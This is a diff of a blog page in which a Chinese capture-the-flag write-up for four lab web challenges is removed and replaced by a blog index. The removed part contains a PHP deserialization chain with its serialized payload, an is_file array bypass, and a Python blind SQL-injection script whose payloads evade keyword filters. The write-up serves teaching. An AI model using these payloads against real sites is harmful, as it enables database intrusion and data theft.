@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">henuctf2021-Web WP | Troy3e</title>
+  <title itemprop="name">Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -179,202 +179,96 @@
   </div>
 </header>
 
-      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
-<div class="pattern-center-blank"></div>
-
-  <div class="pattern-center single-center">
-    <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130992.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130992.png">
-    </div>
-    <header class="pattern-header single-header">
-      <h1 class="entry-title">
-      henuctf2021-Web WP</h1>
-      <p class="entry-census">
-        <span>
-          <a href="">
-            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg">
-          </a>
-        </span>
-        <span>
-          <a href="">Troy3e</a>
-        </span>
-        <span class="bull">
-        ·</span>
-        2021-3-7<span class="bull">
-        ·</span>
-      <span id="busuanzi_value_page_pv"></span>次阅读</p>
-    </header>
-  </div>
-
+      <div class="blank" style="padding-top: 0px;"></div>
 <div id="content" class="site-content">
+  
+  <div class="notice" style="margin-top:60px">
+    <i class="iconfont icon-notification">
+    </i>
+    <div class="notice-content">Social Phobia</div>
+  </div>
+  
+  <div class="top-feature-row">
+  <h1 class="fes-title" style="font-family: 'Ubuntu', sans-serif;">
+  <i class="fa fa-anchor" aria-hidden="true">
+  </i>
+  START:DASH!!</h1>
+  
+  <div class="top-feature-v2">
+    <div class="the-feature square from_left_and_right">
+      <a href="https://space.bilibili.com/129300391" target="_blank">
+        <div class="img">
+          <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/6326234.jpg">
+        </div>
+        <div class="info">
+          <h3>Bilibili</h3>
+          <p>博主的b站视频</p>
+        </div>
+      </a>
+    </div>
+  </div>
+  
+</div>
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
-      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
-        <div class="toc"></div>
-        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
-        
-        <div class="entry-content">
-          <p>实验室内部比赛，四个Web，都没什么难度，但可能没有考虑到20的学习情况，所以相对而言出得确实稍微难了一点。</p>
-<p>一、Find<br>看了大家WP都是直接传flag.php的。。。</p>
-<p>这题的本意其实完全不是这样的，当时出的快没细看，想着总得出一个php基础的题就想到了一个点，没想到大意了（不应该include flag.php的。。。</p>
-<p>本题的考点就是用数组绕过is_file函数：</p>
-<p>name[]=1<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307215001.png" alt></p>
-<p>也算一个比较有意思的点吧 记住就行。</p>
-<p>二、Mai<br>php反序列化，没想到大家都没遇见过这种的。。。我记得buu上有很多反序列化的，可能是还没做到。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307215305.png" alt></p>
-<p>这道题稍微有点反序列化知识就能做，源码也很少。<br>首先根据提示要先知道key，那么就需要触发toString魔法函数，我看到有些同学都在想办法把什么对象当字符串输出，没错这是触发toString的方法之一，但是在这里并没有机会。事实上，只要把对象当成字符串比较就能触发toString了。即我后来提示的wakeup函数的第一行。所以在construct函数中实例化baby类就行了。</p>
-<p>POP链：</p>
-<pre><code>&lt;?php
-class baby{
-    public $baby;
-}
-class flag{
-    public $baby;
-    public function __construct(){
-        $this-&gt;baby = new baby();
-    }
-}
-$troy3e=new flag();
-echo serialize($troy3e);
-?&gt;
-</code></pre><p>得到</p>
-<pre><code>O:4:&quot;flag&quot;:1:{s:4:&quot;baby&quot;;O:4:&quot;baby&quot;:1:{s:4:&quot;baby&quot;;N;}}
-</code></pre><p>传参得key</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307220504.png" alt></p>
-<p>令code等于key</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307220621.png" alt></p>
-<p>传参得flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307220654.png" alt></p>
-<p>最后总结下思路：</p>
-<p>flag类的$this-&gt;baby实例化为baby类 -&gt; Get传参henu触发反序列化 -&gt; 反序列化瞬间触发wakeup -&gt; wakeup函数中将对象当字符串比较触发baby类toString -&gt; 输出key</p>
-<p>三、Love</p>
-<p>和hgame week2 200ok!基本上一模一样的 估计大家都没看我发的wp吧。。。<br>贴个脚本自己看吧<br>出盲注确实有点离谱了，我是想着让大家复习一下hgame那道题的，没想到大家都没看，这种盲注大二之前尽量掌握。  </p>
-<pre><code>import requests
-
-flag = &quot;&quot;
-url = &quot;http://henuctf.com:5555/Love/&quot;
-for i in range(1,1000):
-    l = 28
-    h = 132
-    mid = (l + h) // 2
-    while(l&lt;h):
-        #payload = &quot;1&#39;^(ord(mid(database(),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i,mid)
-        #payload = &quot;1&#39;^(ord(mid((seselectlect(group_concat(table_name))ffromrom(information_schema.tables)where(table_schema=&#39;test&#39;)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid)
-        #payload = &quot;1&#39;^(ord(mid((seselectlect(group_concat(column_name))ffromrom(information_schema.columns)where(table_name=&#39;flaghere&#39;)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid)
-        #payload = &quot;1&#39;^(ord(mid((seselectlect(group_concat(yourflag))ffromrom(test.flaghere)),{0},1))&gt;{1})^&#39;1&#39;#&quot;.format(i, mid)
-        data={&quot;name&quot;:payload,&quot;submit&quot;:&quot;%E7%AB%8B%E5%8D%B3%E5%8C%B9%E9%85%8D&quot;}
-        r = requests.post(url=url,data=data)
-        #print(r.text)
-        if &quot;樱岛麻衣&quot; in r.text:
-            l = mid + 1
-        else:
-            h = mid
-        mid = (l + h) //2
-    flag +=chr(mid)
-    print (flag)
-print (flag)
-</code></pre><p>四、shop</p>
-<p>这题是我前天buu上做到的 因为很简单就让永奇学长复现了环境 没想到大家也没遇见过。。。。确实是我的问题</p>
-<p>这题很多人都做出来了 也就不多说了（因为已经被提示完了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210307221859.png" alt></p>
-
-        </div>
-        <!-- .entry-content -->
-        <div class="single-reward">
-          <div class="reward-open">赏
-            <div class="reward-main">
-              <ul class="reward-row">
-                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picturenull"></li>
-                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/wechat.jpg"></li>
-              </ul>
-            </div>
-          </div>
-        </div>
-        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
-        <footer class="post-footer">
-          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
-          <div class="post-tags">
-          </div>
-          <div class="post-share">
-            <div class="social-share sharehidden share-component"></div>
-            <i class="iconfont show-share icon-forward"></i>
-          </div>
-        </footer><!-- .entry-footer -->
-      </article>
-      <!-- #post-## -->
-      <div class="toc" style="background: none;"></div>
-      <section class="post-squares nextprev">
-        
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/03/10/De1CTF-2019-ShellShellShell/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1135807.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1135807.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                [De1CTF 2019]ShellShellShell</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
-        
-          
-            <div class="post-nepre half next">
-          
-            <a href="/2021/02/20/HGAME-Web-Week3WP/" rel="next">
-              <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1130193.jpg">
-              </div>
-              <span class="label">
-              Next Post</span>
-              <div class="info">
-                <h3>
-                HGAME-Web-Week3WP</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
-      </section>
+      <h1 class="main-title" style="font-family: 'Ubuntu', sans-serif;">
+      <i class="fa fa-envira" aria-hidden="true"></i>
+      Discovery</h1>
       
-<div id="vcomments"></div>
-<script>
-  window.onload = function(){
-      var valine = new Valine();
-      valine.init({
-        el: '#vcomments',
-        appId: "kEnVX5WKqd0JPt4srHAJkgsC-gzGzoHsz",
-        appKey: "h05kFRgBHS516pQ6vIsYtG1B",
-        path: window.location.pathname,
-        placeholder: "你是我一生只会遇见一次的惊喜 ..."
-      })
-  }
-</script>
+  <!-- 首页默认取最最新文章集 -->
+  
+    
+<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
 
-      <section class="author-profile">
-        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-          <a href="" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg" itemprop="image" alt="Troy3e" height="70" width="70"></a>
-          <div class="meta">
-            <span class="title">Author</span>
-            <h3 itemprop="name">
-            <a href="" itemprop="url" rel="author">Troy3e</a>
-            </h3>
-          </div>
+  <div class="post-thumb">
+    <a href="/2019/11/24/我在搭建博客时踩的坑及经验总结/">
+      <img class="lazyload" onerror="imgError(this,3)" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/707101.jpg">
+    </a>
+  </div>
+  <div class="post-content-wrap">
+    <div class="post-content">
+      <div class="post-date">
+        <i class="iconfont icon-time">
+        </i>2019-11-24 14:11</div>
+      <a href="/2019/11/24/我在搭建博客时踩的坑及经验总结/" class="post-title">
+        <h3>我在搭建博客时踩的坑及经验总结</h3>
+      </a>
+      <div class="post-meta">
+        <span><i class="fa fa-tags"></i>
+        
+        </span>
+        <span>
+          <i class="iconfont icon-file"></i>
+          
+            <a href="/categories/技术/">技术</a>
+          
+        </span>
+      </div>
+      <div class="float-content">
+        <p></p>
+        <div class="post-bottom">
+          <a href="/2019/11/24/我在搭建博客时踩的坑及经验总结/" class="button-normal">
+            <i class="iconfont icon-caidan"></i>
+          </a>
         </div>
-        <hr>
-        <p><i class="iconfont icon-write"></i>steamID：888007034</p>
-      </section>
-    </main><!-- #main -->
-  </div><!-- #primary -->
+      </div>
+    </div>
+  </div>
+</article>
+  
+
+
+    </main>
+      <!-- 首页默认取最最新文章集 -->
+    <!-- 
+      <nav class="navigator">
+        
+        <a class="extend prev" rel="prev" href="/page/12/"><i class="iconfont icon-back"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><span class="page-number current">13</span>
+      </nav>
+     -->
+  </div>
+  
 </div>
-
-
 
     </div>    
     <div class="ins-search">
